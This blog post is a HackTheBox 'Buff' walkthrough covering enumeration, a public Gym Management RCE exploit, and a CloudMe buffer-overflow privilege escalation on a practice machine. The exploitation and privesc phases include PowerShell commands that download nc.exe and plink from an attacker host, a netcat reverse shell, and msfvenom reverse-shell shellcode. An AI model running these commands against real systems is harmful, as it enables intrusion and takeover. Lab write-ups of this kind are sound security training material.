@@ -1,0 +1,90 @@
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);># [HackTheBox] Buff</h1><p><a href=/posts/20200810_vulnhub-infosecpreposcp.html> « </a>📅 published on <code>24/Nov/2020</code></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested><img alt=writeup.metadata.infocard src=/static/files/posts_htb_buff/infocard.png.webp></p><p class=nested>This is a writeup for HackTheBox VM <a href=https://www.hackthebox.eu/home/machines/profile/263>Buff</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_htb_buff/killchain.png></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>8080/tcp/http/Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</code>: <a href=https://github.com/7h3rAm/writeups#enumerate_proto_http>enumerate_proto_http</a>, <a href=https://github.com/7h3rAm/writeups#exploit_gymsystem_rce>exploit_gymsystem_rce</a>, <a href=https://github.com/7h3rAm/writeups#exploit_cloudme_bof>exploit_cloudme_bof</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.80 scan initiated Wed Jul 22 21:04:22 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/xml/_quick_tcp_nmap.xml 10.10.10.198
+Nmap scan report for 10.10.10.198
+Host is up, received user-set (0.34s latency).
+Scanned at 2020-07-22 21:04:36 IST for 101s
+Not shown: 999 filtered ports
+Reason: 999 no-responses
+PORT     STATE SERVICE REASON  VERSION
+8080/tcp open  http    syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n's Bro Hut
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 22 21:06:17 2020 -- 1 IP address (1 host up) scanned in 114.83 seconds
+</code></pre><p class=nested>2. We find '8080/tcp' to be open and running <code>Apache httpd 2.4.43</code>. We start by looking at the webpage and find it be hosting a fitness center portal: </p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_htb_buff/screenshot01.png> </p><p class=nested>3. We find multiple pages from the <code>gobuster</code> scan results and upon visiting <code>/contacts.php</code> page, we find that we are interacting with the <code>Gym Management Software 1.0</code> web application: </p><pre class=nested><code>cat ./10.10.10.198/scans/tcp_8080_http_gobuster.txt | grep -v 403
+  /ADMIN (Status: 301) [Size: 343]
+  /About.php (Status: 200) [Size: 5337]
+  /Admin (Status: 301) [Size: 343]
+  /Contact.php (Status: 200) [Size: 4169]
+  /Home.php (Status: 200) [Size: 143]
+  /Index.php (Status: 200) [Size: 4969]
+  /LICENSE (Status: 200) [Size: 18025]
+  /about.php (Status: 200) [Size: 5337]
+  /admin (Status: 301) [Size: 343]
+  /boot (Status: 301) [Size: 342]
+  /contact.php (Status: 200) [Size: 4169]
+  /edit.php (Status: 200) [Size: 4282]
+  /ex (Status: 301) [Size: 340]
+  /feedback.php (Status: 200) [Size: 4252]
+  /home.php (Status: 200) [Size: 143]
+  /img (Status: 301) [Size: 341]
+  /include (Status: 301) [Size: 345]
+  /index.php (Status: 200) [Size: 4969]
+  /index.php (Status: 200) [Size: 4969]
+  /license (Status: 200) [Size: 18025]
+  /packages.php (Status: 200) [Size: 7791]
+  /profile (Status: 301) [Size: 345]
+  /register.php (Status: 200) [Size: 137]
+  /up.php (Status: 200) [Size: 209]
+  /upload (Status: 301) [Size: 344]
+  /upload.php (Status: 200) [Size: 107]
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_htb_buff/screenshot02.png> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>8080/tcp   http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We use <code>searchsploit</code> to find exploits for the webapp and find an unauthenticated remote code execution vulnerability. We inspect the exploit and upon executing it, we get a pseudo-interactive shell on the target machine: </p><pre class=nested><code>python 48506.py http://10.10.10.198:8080/
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_htb_buff/screenshot03.png> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_htb_buff/screenshot04.png> </p><p class=nested>2. To get a fully interactive shell, we use powershell to transfer netcat binary, start a local netcat listener and then catch the incoming connection: </p><pre class=nested><code>nc -nlvp 4433
+
+powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/nc.exe','C:\Users\shaun\Desktop\nc.exe')&quot;
+C:\Users\shaun\Desktop\nc.exe 10.10.14.8 4433 -e cmd.exe
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_htb_buff/screenshot05.png> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_htb_buff/screenshot06.png> </p><p class=nested>3. We use this interactive access to read the <code>user.txt</code> flag: </p><pre class=nested><code>type C:\Users\shaun\Desktop\user.txt
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_htb_buff/screenshot07.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>buff\shaun@BUFF&gt; id
+buff\shaun
+buff\shaun@BUFF&gt;  
+buff\shaun@BUFF&gt; uname
+Host Name:                 BUFF
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.17134 N/A Build 17134
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+buff\shaun@BUFF&gt;  
+buff\shaun@BUFF&gt; ifconfig
+Windows IP Configuration
+  Ethernet adapter Ethernet0:
+    Connection-specific DNS Suffix  . :
+    IPv6 Address. . . . . . . . . . . : dead:beef::616c:bed8:4b75:6e17
+    Temporary IPv6 Address. . . . . . : dead:beef::7813:413b:2e52:5901
+    Link-local IPv6 Address . . . . . : fe80::616c:bed8:4b75:6e17%10
+    IPv4 Address. . . . . . . . . . . : 10.10.10.198
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
+                                        10.10.10.2
+buff\shaun@BUFF&gt;  
+buff\shaun@BUFF&gt; users
+Administrator
+shaun
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. We use <code>winPEAS.exe</code> to enumerate the target machine and within the <code>services restricted from the outside</code> section, find an interesting service bound to <code>127.0.0.1:8888</code>: </p><pre class=nested><code>netstat -anp tcp
+</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_htb_buff/screenshot08.png> </p><p class=nested>2. We find this to be a <code>CloudMe</code> process and there's a binary named <code>CloudMe_1112.exe</code> within the <code>C:\Users\shaun\Downloads</code> directory that hints that the version could be <code>1.11.2</code>: </p><pre class=nested><code>powershell ps
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_htb_buff/screenshot09.png> </p><p class=nested><img alt=writeup.privesc.steps.2.2 src=/static/files/posts_htb_buff/screenshot10.png> </p><p class=nested>3. We find a buffer overflow exploit for this application that could give us elevated privileges if the <code>CloudMe</code> process is running as Administrator: </p><pre class=nested><code>searchsploit cloudme
+</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_htb_buff/screenshot11.png> </p><p class=nested>4. But we cannot connect to this service from our attacking machine. We will need to setup a port forward for this exploit to work. We start the SSH service on our attacking machine, transfer the <code>plink.exe</code> binary and setup the port forward: </p><pre class=nested><code>service ssh restart
+service ssh status
+powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/plink64.exe','C:\Users\shaun\Desktop\plink.exe')&quot;
+C:\Users\shaun\Desktop\plink.exe -v -x -a -T -C -noagent -ssh -pw &quot;kali&quot; -R 8888:127.0.0.1:8888 kali@10.10.14.8
+</code></pre><p class=nested><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_htb_buff/screenshot12.png> </p><p class=nested><img alt=writeup.privesc.steps.4.2 src=/static/files/posts_htb_buff/screenshot13.png> </p><p class=nested>5. We update the exploit with the right shellcode, setup a reverse shell to catch incoming connection and run the exploit: </p><pre class=nested><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=443 -b &quot;\x00\x0a\x0d&quot; -f python -a x86 --platform windows -e x86/shikata_ga_nai
+
+sudo nc -nlvp 443
+python 48389.py
+</code></pre><p class=nested><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_htb_buff/screenshot14.png> </p><p class=nested>6. We immmediately get an elevated reverse shell connection and use it to read the <code>root.txt</code> flag: </p><pre class=nested><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.6.1 src=/static/files/posts_htb_buff/screenshot15.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.hackthebox.eu/home/machines/profile/263>https://www.hackthebox.eu/home/machines/profile/263</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20200810_vulnhub-infosecpreposcp.html>[VulnHub] InfoSec Prep: OSCP</a> «</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
